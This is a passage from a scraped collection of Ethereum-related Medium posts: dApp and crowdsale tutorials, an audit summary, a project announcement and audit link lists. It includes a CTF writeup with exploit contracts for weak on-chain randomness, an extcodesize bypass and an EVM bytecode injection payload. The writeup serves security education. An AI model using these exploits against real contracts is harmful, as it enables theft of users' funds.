connection by querying ganache and listing all the accounts. Running the below commands in your nodejs console should list 10 accounts.> provider = new ethers.providers.JsonRpcProvider()> provider.listAccounts().then(result => console.log(result))The next step is to initialize the signer which is used to sign the transactions. We can select which account we want to use (we have 10 accounts ganache in setup) by passing the index to getSigner as shown below. Once the wallet is intialized, create a contract factory and deploy the contract as shown. The deploy function takes an array of arguments that is passed to the constructor of the contract. In our case, we pass in the names of the candidates. We have to explicitly convert string to bytes32 because our contract takes bytes32 as argument.> signer = provider.getSigner(0)> factory = new ethers.ContractFactory(abi, bytecode, signer)> contract = null> factory.deploy([ethers.utils.formatBytes32String(\u2018Rama\u2019), ethers.utils.formatBytes32String(\u2018Nick\u2019), ethers.utils.formatBytes32String(\u2018Jose\u2019)]).then(\u00a9 => { contract = c})If you successfully deployed the contract, your contract object should have all the details of the deployed contract. There are hundreds of thousands of contracts deployed on the blockchain. So, how do you identify your contract in that blockchain? Answer: contract.address. When you have to interact with your contract, you need this deployed address and abi definition we talked about earlier.3. Interact with the contract in the nodejs\u00a0console> contract.totalVotesFor(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f.toNumber()))> contract.voteForCandidate(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f))> contract.totalVotesFor(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f.toNumber()))Try the above commands in your node console and you should see the vote count increment. Every time you vote for a candidate, you get back a transaction id: Example: \u20180xdedc7ae544c3dde74ab5a0b07422c5a51b5240603d31074f5b75c0ebc786bf53\u2019 above). This transaction id is the proof that this transaction occurred and you can refer back to this at any time in the future. This transaction is immutable. This immutability is one of the big advantages of blockchains such as Ethereum.4. Webpage to connect to the blockchain and\u00a0voteNow that most of the work is done, all we have to do now is create a simple html file with candidate names and invoke the voting commands (which we already tried and tested in the nodejs console) in a js file. Below you can find the html code and the js file. Drop both of them in the ethereum_voting_dapp/chapter1-ethersjs directory and open the index.html in your browser.You should now see the vote counts and you should also be able to vote for candidates.If you are using a wallet like Metamask, you will need to use a Web3 provider instead of JsonRPCProvider we used earlier. To do that, simply change the provider in your index.js to:provider = new ethers.providers.Web3Provider(web3.currentProvider);If you want to interact through Metamask, you can\u2019t just open index.html and interact in your browser anymore. You have to server the file through a server. So, install a simple webserver and start like belowzastrin@macbook$ npm install http-serverzastrin@macbook$ http-serverYou can now go to localhost:8080 and interact with your application. Below is a quick demo which includes loading test ether account into metamask.I hope you were able to follow along and get the application working. Check out Zastrin.com, and sign-up to get more tutorials and lessons so you can build and deploy real working dApps.Start contributing to the community and decentralization, and become a Zastrin developer. If you run into issues getting the application working, feel free to DM me on twitter @zastrinlab or email mahesh@zastrin.com.", "responses": "1"}, {"title": "State Channels for Babies, Part\u00a02", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/state-channels-for-babies-part-2-40e6b2ebec42?source=search_post", "post_date": "Aug 3, 2018", "readtime": "3 min read", "upvotes": "142", "content": "State Channels for Babies, Part\u00a02They Grow Up So\u00a0FastBlockChannelBlockedUnblockFollowFollowingAug 3, 2018Cross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Okay, maybe this one is for toddlers.In our last installment, we introduced the basic principles of state channels\u200a\u2014\u200awhat they are, and how they can help make blockchains more accessible. However, we skimmed over the details of how they work and where state channel research is headed.This week, we take a deeper look at state channel architecture: how channels are opened, the differences between payment channels and state channels, and counterfactual instantiation.We rely on terms and definitions from previous chapters, so if you haven\u2019t already read them, take a look at our first two posts:Blockchains for BabiesState Channels for Babies Pt.1Without further ado, we present:", "responses": ""}, {"title": "State Channels for Babies, Part\u00a03", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/state-channels-for-babies-part-3-5ecc2867a17b?source=search_post", "post_date": "Sep 1, 2018", "readtime": "4 min read", "upvotes": "101", "content": "State Channels for Babies, Part\u00a03Putting All The Pieces\u00a0TogetherBlockChannelBlockedUnblockFollowFollowingSep 1, 2018Cross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.This is the last one on state channels, we promise!In previous installments, we introduced you to state channels and dug a little deeper into what makes them tick.This week, we\u2019re going to take a dive into the architecture of \u201cmultihop\u201d payments and a few different strategies for implementing them.We rely on terms and definitions from previous chapters, so if you haven\u2019t already read them, take a look at our first two posts:Blockchains for BabiesState Channels for Babies Part 1State Channels for Babies Part 2There are many ways to illustrate and educate the community on state channels. Existing state channels information remains somewhat esoteric, but it is important we disseminate this knowledge in a multitude of ways so that more people can grasp where we are in terms of scalability.For a more in-depth look, check out the Counterfactual for Dummies and State Channels for Dummies series by Eric Olszewski.Without further ado, we present:", "responses": ""}, {"title": "PHDays 8: EtherHack Contest\u00a0Writeup", "author_name": "Arseny Reutov", "link": "https://blog.positive.com/phdays-8-etherhack-contest-writeup-794523f01248?source=search_post", "post_date": "May 22, 2018", "readtime": "9 min read", "upvotes": "36", "content": "PHDays 8: EtherHack Contest\u00a0WriteupArseny ReutovBlockedUnblockFollowFollowingMay 22, 2018This year at PHDays security conference a new contest called EtherHack was held. The goal was to be the first to solve all tasks which featured smart contract vulnerabilities. Here we present the detailed explanation of intended solutions.Azino 777The goal of this level is to win the lottery and hit the jackpot!The first three tasks featured bad randomness issues that were covered in our recent research \u201cPredicting Random Numbers in Ethereum Smart Contracts\u201d. The first task being the easiest one had a PRNG that relied on the blockhash of the last block and used it as a source of entropy for random numbers:As the result of block.blockhash(block.number-1) would be the same for any transaction within the same block, the attack assumed the use of an exploit contract with the same rand() function that called the target contract via an internal message:function WeakRandomAttack(address _target) public payable {    target = Azino777(_target);}function attack() public {    uint256 num = rand(100);    target.spin.value(0.01 ether)(num);}Private RyanWe added a private seed, nobody will ever learn it!This task was a bit tougher variation of the previous one. A variable seed deemed private was used as an offset to a block.number so that the blockhash would not be bound to the previous block. After each bet seed would be overwritten with a new \u201crandom\u201d value. This was the case of Slotthereum lottery.contract PrivateRyan {  uint private seed = 1;  function PrivateRyan() {    seed = rand(256);  }  function spin(uint256 bet) public payable {    require(msg.value >= 0.01 ether);    uint256 num = rand(100);    seed = rand(256);    if(num == bet) {        msg.sender.transfer(this.balance);    }  }  /* ... */}Similarly to the previous task, a successful attacker would just need to copy the rand() function into the exploit contract, but this time the value of private variableseed should have been obtained off-chain and then supplied to the exploit as an argument. To do so, one could take advantage of web3.eth.getStorageAt() method of web3 library:Reading contract storage off-chain to obtain the\u00a0seedWhen we\u2019ve got the seed, all one need to do is just supply it to practically the same exploit as in the first task:contract PrivateRyanAttack {  PrivateRyan target;  uint private seed;  function PrivateRyanAttack(address _target, uint _seed) public payable {    target = PrivateRyan(_target);    seed = _seed;  }  function attack() public {    uint256 num = rand(100);    target.spin.value(0.01 ether)(num);  }  /* ... */}Wheel of\u00a0FortuneThis lottery uses blockhash of a future block, try to beat it!As per task description, the goal was to predict the blockhash of a block whose number was saved in the Game structure upon the bet occurred. This blockhash was then retrieved to generate a random number when a subsequent bet was made.There were two possible solutions:one could call the target contract two times from exploit contract, the first call would result in block.blockhash(block.number) being always zeroone could wait for 256 blocks to be mined before making the second bet, so that blockhash of the saved block.number would give a zero due to EVM limitations of the number of available blockhashesIn both cases the winning bet would be uint256(keccak256(bytes32(0))) % 100 or \u201c47\u201d.Call Me\u00a0MaybeThis contract does not like when other contracts are calling it.One way to protect the contract from being called by other contracts is to use the extcodesize EVM assembly instruction which returns the size of the contract specified by its address. The technique is to use this opcode in inline assembly against msg.sender\u2019s address. If the size for the address is greater than zero, then msg.sender is a contract since normal addresses in Ethereum do not have any associated code. The task used exactly this approach to prevent other contracts from calling it.Transaction property tx.origin refers to the original issuer of the transaction while msg.sender points to the last caller. If we send the transaction from the normal address, these variables will be equal and we will end up with a revert(). That is why in order to solve the challenge one needed to bypass extcodesize check so that tx.origin and msg.sender would differ. Luckily, there is a nice EVM peculiarity that could help to achieve this:Indeed, at the moment when a newly deployed contract calls another contract in its constructor it does not yet exist on the blockchain, it acts as a wallet only. Hence, it does not have associated code and extcodesize would yield zero:contract CallMeMaybeAttack {    function CallMeMaybeAttack(CallMeMaybe _target) payable {        _target.HereIsMyNumber();    }    function() payable {}}The LockThe lock is\u2026 locked! Try to find the correct pincode via unlock(bytes4 pincode) function. Each unlock attempt costs 0.5 ether!This task didn\u2019t reveal any piece of code so the participants had to reverse engineer the smart contract bytecode in order to solve the challenge. One of the ways to achieve this was to use radare2 framework which supports EVM disassembly and debugging.Firstly, let\u2019s deploy the task instance and submit a random guess:await contract.unlock(\"1337\", {value: 500000000000000000}) \u2192falseWell, it was a solid attempt, but we didn\u2019t have much luck. Let\u2019s try to debug this transaction.r2 -a evm -D evm \"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7\"Here we instruct radare2 to use \u201cevm\u201d architecture. The tool then connects to the specified full node and retrieves VM trace of that transaction. At this point we are all set to dive into the EVM bytecode.The first thing we have to do is to perform analysis:[0x00000000]> aa[x] Analyze all flags starting with sym. and entry0 (aa)Then we disassemble the first 1000 instructions (should be enough to cover the whole contract) with pd 1000 and switch to graph view with VV.EVM bytecode compiled with solc usually starts with a function dispatcher which decides which function to call based on the first 4 bytes of call data which is a function signature defined as bytes4(sha3(function_name(params)))\u00a0. The function of interest for us is unlock(bytes4) which corresponds to 0x75a4e3a0\u00a0.Following the flow execution by pressing s we get into the node which compares callvalue with the value 0x6f05b59d3b20000 or 500000000000000000 which is 0.5 ether:push8 0x6f05b59d3b20000callvalueltIf we supplied a necessary amount of ether, we get into a node that resembles a control structure:push1 0x4dup4push1 0xffandltiszeropush2 0x1a4jumpiIt pushes value 0x4 onto the stack, performs some bounds checks (must not be greater than 0xff) and makes lt comparison with some value that got duplicated from the 4th stack item (dup4).Scrolling to the bottom of the graph we see that this 4th item is actually an iterator and this control structure is a loop which corresponds to for(var i=0; i<4; i++):push1 0x1addswap4Looking at the loop body it is evident that it iterates over the input 4 bytes and performs some operations on each byte. Firstly, it ensures that Nth byte is greater than 0x30:push1 0x30dup3ltiszeroand then that it is lower than 0x39:push1 0x39dup3gtiszerowhich basically is a check that the byte is within 0\u20139 range. If the check succeeds, we get into the most important code block:Let\u2019s split it into the following parts:3rd element on the stack is an ASCII code of the Nth byte of the pincode. 0x30 (ASCII code of zero) is pushed onto the stack and then subtracted from the byte\u2019s code:push1 0x30dup3subWhich means pincode[i] - 48 or we basically get here the actual digit from the ASCII code, let\u2019s define it as d.2. 0x4 is pushed onto the stack and then is used as exponent for the second element on the stack which isd:swap1poppush1 0x4dup2expWhich means d ** 43. 5th element from the stack is retrieved and the result of exponentiation is added to it, let\u2019s define it as S:dup5addswap4popdup1Which means S += d ** 44. 0xa (ASCII code for 10) is pushed onto the stack and is used as a multiplier for the 7th element from the stack (6th before the push), we don\u2019t know what it is, so let\u2019s define it as U. Then d is added to the result of the multiplication:push1 0xadup7muladdswap5popWhich means: U = U * 10 + d or, simply put, this expression reconstructs the whole pincode as a number from individual bytes ([0x1, 0x3, 0x3, 0x7] \u2192 1337).We did the most difficult part, now let\u2019s proceed to the code after the loop.dup5dup5eqIf 5th and 6th elements on the stack are equal, the flow will get us to an sstore which sets some flag in the contract storage. Since this is the only sstore, this is probably what we are looking for!But how do we pass this check? As we have discovered earlier, 5th element on the stack is S and 6th element is U. Since S is a sum of each pincode digit raised to the 4th power, we need a pincode that will be equal to this sum. In our case, the code tested that 1**4 + 3**4 + 3**4 + 7**4 was not equal to 1337 and we didn\u2019t reach the winningsstore.Surely, we can now find a number that satisfies this equation. There are only three numbers that can be written as the sum of fourth powers of their digits: 1634, 8208, 9474. Any of them would unlock the lock!Pirate ShipAhoy, landlubber! The pirate ship \u201cBlack Pearl\u201d is at anchor. Make it pull the anchor and haul the black jack flag to set off for the search of treasures.The normal workflow of the contract assumed three actions:call dropAnchor() with a block number that must be greater than 100k blocks than the current one. The function dynamically creates a contract that represents \u201can anchor\u201d, which can be \u201cpulled\u201d with a selfdestruct() after the specified blockcall pullAnchor() that triggers selfdestruct() if enough time has passed (really long time!)call sailAway() that sets blackJackIsHauled to true if the anchor contract does not existThe vulnerability is quite evident: we have a direct assembly injection into a newly created contract in dropAnchor(). But the real challenge was to craft a payload that would let us pass the condition on block.number.In EVM it is possible to create contracts using create opcode. Its arguments are \u201cvalue\u201d, \u201cinput offset\u201d and \u201cinput size\u201d. Value is a bytecode that unwraps the actual contract, i.e. init code. In our case init code + code to deploy is just a uint256 (kudos to GasToken team for the idea):0x6a63004141414310585733ff600052600b6015f3where the bytes in bold is the contract code to deploy and 414141 is the injection point. Since our goal is to get rid of throw we need to inject our new contract and overwrite the trailing part of init code. Let\u2019s try to inject this new contract with 0xff which will unconditionally selfdestruct() the anchor contract:68 414141ff3f3f3f3f3f ;; push9 contract60 00                 ;; push1 052                    ;; mstore60 09                 ;; push1 960 17                 ;; push1 17f3                    ;; returnIf we convert this sequence of bytes to a uint256 (9081882833248973872855737642440582850680819) and supply it as an input to dropAnchor(), it will give us the following value of code variable (bytecode in bold is our payload):0x630068414141ff3f3f3f3f3f60005260096017f34310585733ffAfter code variable becomes part of initcode variable we get the following value:0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3As you see high bytes 0x6300 are gone, the trailing part containing the original bytecode is discarded after 0xf3 (return).As a result a new anchor contract with altered logic is created:41 ;; coinbase41 ;; coinbase41 ;; coinbaseff ;; selfdestruct3f ;; junk3f ;; junk3f ;; junk3f ;; junk3f ;; junkIf we now call pullAnchor(), this contract will be immediately destroyed since we don\u2019t have a condition on block.number any more. After that, the call tosailAway() will make us a winner!ResultsThe first place and 1,000 USD in Ether: Alexey Pertsev (p4lex)The second place and Ledger Nano S: Alexey KarpovThe third place and PHDays souvenirs: Alexander VlasovFull standings: https://etherhack.positive.com/#/scoreboardCongratulations to the winners and thanks to all participants!P.S. Kudos to Zeppelin for open-sourcing Ethernaut CTF platform.", "responses": "2"}, {"title": "Livepeer Smart Contract Security Audit #1\u00a0Results", "author_name": "Doug Petkanics", "link": "https://medium.com/livepeer-blog/livepeer-smart-contract-security-audit-1-results-631c4d7d98a4?source=search_post", "post_date": "Mar 14, 2018", "readtime": "3 min read", "upvotes": "56", "content": "Livepeer Smart Contract Security Audit #1\u00a0ResultsDoug PetkanicsBlockedUnblockFollowFollowingMar 14, 2018Prior to launching Livepeer on Ethereum\u2019s MainNet network, we felt it important to conduct significant internal testing across multiple networks, complete a round of internal security audits, and work with an external 3rd party security firm to audit and do a security review of the Livepeer smart contracts. We worked with Trail of Bits (ToB) over the course of a couple weeks, and they recently completed their audit.You can read the full Livepeer audit report by Trail of Bits here.In summary, ToB dug deep into the inner workings of the Livepeer protocol and smart contracts. They covered many different areas using both automated tools, custom written tests, and manual inspection and debugging. The report that they produced included:3 potential low severity issues2 potential informational issues0 medium or high severity issues2 code maintainability recommendations.After discussions and recap, Livepeer has produced a response to each of the reported issues, along with a few short term actions.Read Livepeer\u2019s detailed technical response here.In light of the findings and response, Livepeer is in a better place to move forward with its upcoming network launch, knowing that the project has worked with talented external security researchers in an attempt to exploit the protocol. Zero of the reported issues are blockers for the upcoming alpha, but all are positive recommendations for future iteration. Livepeer will continue to engage external security partners going forward as it deploys significant upgrades to the network and iterates over time. For more details around the goals and execution of the audit process, read on.Trail of\u00a0BitsAfter an extensive outreach and educational process around evaluating different potential security partners, Livepeer was excited to have selected Trail of Bits as its first external audit partner for the following reasons.They were an existing security firm of professionals which predated the recent boom of Ethereum and Solidity smart contract audits.They have a positive recent track record in the Ethereum, EVM, and blockchain world, having recently run audits for MakerDAO, Parity, and RSK.They have built and contributed open source tools to the security research world including Manticore and Echidna.Positive recommendations and reference checks.Significant track record of community engagement including research publications and security conference presentations.Professional and responsible communication, organization, management, and execution. The quote and work were on time and on budget.Audit GoalsToB understood that Livepeer would be rolling out gradually over time and iterating frequently. Since protocol upgrade and parameter upgrade mechanisms were built in, the goals of the audit were less about giving the current code base the full stamp of approval, and more about making sure the important mechanisms that enable upgrades, bug fixes, iteration, and protect user value were in place. The audit primarily was aimed to focus on three areas:Liveness\u200a\u2014\u200athe Livepeer protocol progresses in rounds, and each round needs to be initialized in order for broadcast jobs to be sumitted and rewards to be earned. Can anything halt this process and \u201cfreeze\u201d the protocol?Ownership\u200a\u2014\u200aduring the iterative period and gradual network rollout, the core team can update economic parameter values, fix bugs, and deploy smart contract upgrades. Are there any ownership vulnerabilities that allow a malicious actor to access these capabilities?Value\u200a\u2014\u200ausers stake tokens into Livepeer smart contracts in order to do work on the network. Can anything put this user value at risk such that it can get locked up or stolen?ToB lead with a focus on these areas, but was also able to touch on many others including job and rounds management, bonding, deep dives into on chain data structures, and the earnings distribution functions.See the full report for detailed findings. As Livepeer goes to mainnet and iterates on its protocol, look for opportunities to participate in security reviews through potential bug bounty and development bounty programs.", "responses": "1"}, {"title": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library\u200a\u2014\u200aPart\u00a01", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/how-to-build-a-simple-capped-crowdsale-token-using-openzeppelin-library-part-1-2789ec642308?source=search_post", "post_date": "Oct 22, 2018", "readtime": "5 min read", "upvotes": "88", "content": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library\u200a\u2014\u200aPart\u00a01Using Open-Zeppelin Library to build a basic capped ERC20 token\u00a0sale.Gaurav AgrawalBlockedUnblockFollowFollowingOct 22, 2018Today, we are going to build a capped crowdsale with a mintable token using open-zeppelin library. (If you are a complete beginner, you should check out the previous tutorial on how to set up a solidity project and how to test a contract.) Open-zeppelin library provides basic building blocks to build an ERC20 Token on ethereum and will abstract away a lot of details for building an ERC20 token to get us up and running quicker.PrerequisiteBasic solidity conceptsUnderstanding of ERC20 token standard and implementationThings we will cover in the article:DefinitionsOpen ZeppelinBuilding a crowdsaleDefinitionsERC20 TokenERC20 is an ethereum standard for building a token. It defines a set of functions which a smart contract has to implement in order be ERC20 compliant. These standards are important to ethereum ecosystem and also helps you to make your contract robust, predictable and bug-free.CrowdsaleA crowdsale is selling tokens to meet the financial requirements of the projects. Project share equity as a form of the token to contributors. In crypto world, crowd sales are called ICOs (Initial coin offering).Capped CrowdsaleA project can have different types of constraints, one of them is capping. A capped crowdsale sets a limit on the total funding accepted and the number of tokens that will be distributed by the project. For example, we can cap on total ether contribution or if you want to put a cap on an investor for minimum contribution (let\u2019s say 2 ether) and maximum contribution (let\u2019s say 50 ether).Benefits of a capped ICOA capped ICO helps investors to estimate value per token. It puts out the distribution structure and contributors get to know how many tokens are getting hold by the team and what are the plans to spend raised funds. It can also create a scarcity, thus increasing the value per token.Minimum and maximum contribution cap help to get more people to participate in the token distribution, you don\u2019t want that all the token get bought by 100 people.Mintable TokenIn Mintable token, smart contract mint(create) tokens on the time of contribution. In this, you don\u2019t permit tokens, so total supply gets decided based on total contributed ethers. Our contract will handle this logic too.Building A Capped Crowdsale Token Using Open-Zeppelin LibraryOpen ZeppelinWe will use open zeppelin library to build our smart contract. Open zeppelin library provides basic building blocks to build an ERC20 Token on ethereum. It is a well-tested library and many projects use it on their production so it\u2019s safe too.Building a capped crowdsale contractSo let\u2019s build a smart Capped ERC20 token. We will call our Token Example token. Below is code for ExampleToken and ExampleTokenCrowdsale.ExampleToken.sol\u200a\u2014\u200aCode for our Example tokenExampleTokenCrowdsale.sol\u200a\u2014\u200acode for our crowdsale ContractWe are using open-zeppelin library which will abstract away a lot of details for building an ERC20 token and crowdsale contract. Feel free to ask questions on the comment section, if you don\u2019t get something.Installing OpenZeppelin SolidityWe need to install openZeppelin library using NPM.npm install openzeppelin-solidityLet\u2019s go through our contracts on by one.Our ERC20 Token\u200a\u2014\u200aExampleToken.solIn this contract, we are defining ERC20 Token. One important thing to understand that open-zeppelin modularize many things, so don\u2019t get overwhelmed with the so many file imports. If you come from the object-oriented background, then just see them as contracts inheriting interfaces and other contracts for their properties.image sourceLet\u2019s look at our imports, we are importing 3 contracts from the open-zeppelin library, we will go through them one by one. You can find all these files inside node_modules under given path.import \"openzeppelin-solidity/contracts/token/ERC20/DetailedERC20.sol\";import \"openzeppelin-solidity/contracts/token/ERC20/StandardToken.sol\";import \"openzeppelin-solidity/contracts/token/ERC20/MintableToken.sol\";DetailedERC20.solThis contract itself importing ERC20.sol which is simply the ERC20 interface. This will be used for initializing our token. As you can see, you need to set Token name, symbol and how many decimal point it will use. For example, ethereum uses 18 decimal point, where the smallest unit is wei (1 ether= \u00b9\u2070\u00b9\u2078 wei).pragma solidity ^0.4.24;import \"./ERC20.sol\";contract DetailedERC20 is ERC20 {  string public name;  string public symbol;  uint8 public decimals;constructor(string _name, string _symbol, uint8 _decimals) public {    name = _name;    symbol = _symbol;    decimals = _decimals;  }}You can go on and check ERC20.sol which is importing ERC20Basic.sol and these two files combined have standard functions of an ERC20 token.StandardToken.solThis contract is a standard and well-tested implementation of ERC20 token methods. For the sake of simplicity, I am not adding contract code, you can check contract under the same path.MintableToken.solThis contract has our token minting logic. So let\u2019s look at this contract closely. It\u2019s importing ownable and StandardToken.Ownable contract helps in putting access controls and managing ownership. It defines modifiers using which functions can be made owner accessible and It helps you to manage contract ownership.Now, let\u2019s look at out mint() function, It receives two parameters one is beneficiary account and another is a total number of tokens to be added. notice mint() function, it\u2019s increasing total supply and balances variable is available through inheriting StandardTokencontract, which maintain the balance of every contributor.This function will be called from MintedCrowdsale contract (we will see that in the next part of this tutorial).pragma solidity ^0.4.24;import \"./StandardToken.sol\";import \"../../ownership/Ownable.sol\";contract MintableToken is StandardToken, Ownable {  event Mint(address indexed to, uint256 amount);  event MintFinished();bool public mintingFinished = false;modifier canMint() {    require(!mintingFinished);    _;  }modifier hasMintPermission() {    require(msg.sender == owner);    _;  }function mint(    address _to,    uint256 _amount  )    public    hasMintPermission    canMint    returns (bool)  {    totalSupply_ = totalSupply_.add(_amount);    balances[_to] = balances[_to].add(_amount);    emit Mint(_to, _amount);    emit Transfer(address(0), _to, _amount);    return true;  }function finishMinting() public onlyOwner canMint returns (bool) {    mintingFinished = true;    emit MintFinished();    return true;  }}ConclusionIn this part, we have created a Capped ERC20 token using open-zeppelin library. We have talked about different basic contracts provided by open-zeppelin library and how can we use them to build a capped ERC20 token.In the next part, we will cover our ExampleTokenCrowdsale contract and will see how we can use different open-zeppelin library contracts to build our crowdsale smart contract.On To Part 2\u00a0\u2192Notes & SuggestionsThere are a lot of things which handled by open-zeppelin library and almost every basic functionality is provided by the library. If you don\u2019t understand something, please comment.If you have any problem while following through this tutorial, Check out my github code.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": "3"}, {"title": "Introducing Harbour", "author_name": "Dean Eigenmann", "link": "https://medium.com/harbour/introducing-harbour-55f0170bdf97?source=search_post", "post_date": "Oct 17, 2017", "readtime": "3 min read", "upvotes": "92", "content": "Introducing HarbourRebuilding GovernanceDean EigenmannBlockedUnblockFollowFollowingOct 17, 2017After the decision to steer our project in a new direction over two months ago, the Harbour team has been working hard behind the scenes to achieve our new goals. Today, we want to share what we have been working on over the past two months: the beginning of a protocol-based governance system.One of our goals from the very beginning was to improve governance. We see it as the last, major piece of the puzzle missing from a truly complete token ecosystem. The road ahead will be pretty difficult and challenging, but we see the potential long term rewards far outweighing the difficulty of the endeavor we have full confidence in our team, advisors, and network that we will be up to the task.Our first supporters and partners come from the blockchain world, but we believe that an effective blockchain-based governance protocol will be a basic need of any type of organization. Everything from a two-person partnership to entire nations will need it.An open standard for DemocracyAs we studied governance, one thing became very clear to us: virtually all democratic forms were built using the same components. With these individual components, we can enable anyone to build any type of democratic structure they can imagine.The democratic structures themselves effectively form modules, which can be built, shared, re-imagined, and re-combined in any fashion as people choose. We eagerly await the countless iterations of modules that will arise, how they will usefully impact the organizations where they are implemented and deployed, and the organizing principles no one has yet dreamed up yet that will result.PartnershipsWith our new direction, we have already been able to generate interest from other projects building and innovating in the space. We will be announcing our active partnerships very soon, so stay tuned.New MembersUser experience and interaction will be paramount in deploying our solution, both from the developer and client perspective. We feel it is an area that is too often overlooked or given short shrift in our space. That\u2019s why we recruited two passionate new members.Samuel Furter - Samuel is our multi-talented frontend developer. He is an adept Javascript developer with excellent awareness and know-how within the Ethereum environment. We have full faith given his output so far that he is going to help us deliver an amazing product.Selim Imoberdorf - Selim is an incredibly passionate and adept frontend developer specializing in UX/UI. He has over ten years of experience spanning multiple projects and has studied interaction design extensively. He is already doing amazing work.What\u2019s next?Our team is focused on building a fully-fledged beta of our product, and we will be offering regular updates on our project status. In the coming days, we will also update our website, and release an initial draft of our whitepaper.At present, we iterate through our alpha, and getting it out to various partners in order for them to test it.Our hope in the near and long-term is that more and more people will use Harbour and see its obvious benefits in revolutionizing governance.To stay up to date with our project, check out our website and join our telegram.", "responses": ""}, {"title": "Smart Contract Audit Resources &\u00a0Links", "author_name": "Priyab Dash", "link": "https://medium.com/crypt-bytes-tech/smart-contract-audit-resources-links-da1cf571a80d?source=search_post", "post_date": "Nov 29, 2017", "readtime": "4 min read", "upvotes": "30", "content": "Smart Contract Audit Resources &\u00a0LinksPriyab DashBlockedUnblockFollowFollowingNov 29, 2017For Anyone planning to launch ICO or want explore Smart Contract Audit, Feedback WelcomeBuilding a Marketplace for Security AuditsIncentivizing the use of Ethlance for auditing servicesblog.district0x.ioSmart Contract Security: How to Never Break the Blockchain - DZone SecurityThis article is featured in the new DZone Guide to Application and Data Security, Volume II. Get your free copy for\u2026dzone.comDevelopment, Testing And Security Audit Of The CustomerDepositFactory Smart Contract\u2190 BetterAuction Smart Contract - Testing, Security Audit, And Assisting With The Developmentwww.bokconsulting.com.auChainSecurity - Innovative Security Solutions all around BlockchainsBlockchains and smart contracts promise to automate, decentralize, and increase the transparency of many real-world\u2026chainsecurity.comSecurify \u2666 Formal Verification of Ethereum Smart ContractsAnalyse any contract for critical security vulnerabilities and insecure coding. One click only. Formal security\u2026securify.chThe Importance Of Audits And Secure Coding For Smart ContractsDecember 23, 2016 4:24 PM Making sure smart contract code is secure not only helps individual companies, it benefits\u2026www.ethnews.comNumber One smart contracts security expert to audit ChronoBankPeter Vessenes, the global blockchain and smart contracts expert who first drew attention to the vulnerability in The\u2026blog.chronobank.ioBlockchain Development Company - Smart Contracts Development - FinTechOur smart contract development and full stack blockchain development services are supported by more than 20 years of\u2026www.coinfabrik.comCoinFabrik Blog - Secure Cryptocurrency Applications DevelopmentSecure Cryptocurrency Applications Developmentblog.coinfabrik.comICO Security AuditAn audit provides an assessment of whether your organisation is following good data protection practice. We believe\u2026www.toshblocks.comJust how smart are Smart Contracts?If you haven't yet heard of a Smart Contract, just wait. You will. Using blockchain technology - a secure\u2026www.csoonline.comThinking About Smart Contract Security - Ethereum BlogOver the last day with the community's help we have crowdsourced a list of all of the major bugs with smart contracts\u2026blog.ethereum.orgGeneral Philosophy\ue3c9 Ethereum and complex blockchain programs are new and highly experimental. Therefore, you should expect constant\u2026consensys.github.ioRecommendations for Smart Contract Security in Solidity\ue3c9 This page demonstrates a number of solidity patterns which should generally be followed when writing smart contracts\u2026consensys.github.ioKnown Attacks\ue3c9 The following is a list of known attacks which you should be aware of, and defend against when writing smart\u2026consensys.github.ioSoftware Engineering Techniques\ue3c9 As we discussed in the General Philosophy section, it is not enough to protect yourself against the known attacks\u2026consensys.github.ioDocumentation and Procedures - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Tools - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Notifications - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioEthereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSolidity Smart contract Security best practicesSecurity of a smart contract is more important than any other software or piece of code just because of the non\u2026lightrains.comEthereum Contract auditing(solidity)Ethereum Stack Exchange is a question and answer site for users of Ethereum, the decentralized application platform and\u2026ethereum.stackexchange.comMethodological security review of a smart contractThis is the community wiki (no reputation) answer for possible attacks and how to protect against them. Feel free to\u2026ethereum.stackexchange.comSmart Contract Security - Ethereum BlogSolidity was started in October 2014 when neither the Ethereum network nor the virtual machine had any real-world\u2026blog.ethereum.orgSmart Contract Analyzer to Debut at Ethereum Conference - CoinDeskResearchers from National University of Singapore will soon release a tool that will help ethereum users determine\u2026www.coindesk.comSmart Contract\u200a\u2014\u200aSecurity AuditA detailed write up of the Sharpe Capital smart contract security audit.medium.comZeppelin: Security AuditsAt Zeppelin, we perform private and public code audits for organizations. We review your smart contracts and\u2026zeppelin.solutionsOnward with Ethereum Smart Contract SecurityIf you\u2019re new to Ethereum development, I recommend you read our Hitchhiker\u2019s Guide to Smart Contracts in Ethereum\u2026blog.zeppelin.solutionsSmartDec | Smart Contracts Security AuditWith the arrival of Smart Contracts, Application Security has become more important than ever before. Keep your code\u2026smartcontracts.smartdec.netPreparing for a Smart Contract Code AuditIf you are planning to launch a project on the Ethereum blockchain, you probably know the importance of a third-party\u2026media.consensys.netSmart Contracts Security, Pt. 1This series of texts is dedicated to analysing smart contract security. In the following sections, we explain what\u2026blog.smartdec.netTrust No One: Ethereum Smart Contract Security Is Advancing - CoinDesk\"Everyone here is a target for attack. Be paranoid.\" That's how Ethereum Foundation security lead Martin Swende ended\u2026www.coindesk.comThe ultimate guide to audit a Smart Contract + Most dangerous attacks in SolidityHave you ever wondered how to audit a Smart Contract to find security breaches?medium.comTokenLot - Your ICO SuperstoreIn order to navigate the constantly changing regulatory landscape of emerging technologies, sound advice from a trusted\u2026www.tokenlot.comIf you have any good resources, please do share in the comment below, will add them.Disclaimer: This is not investment or 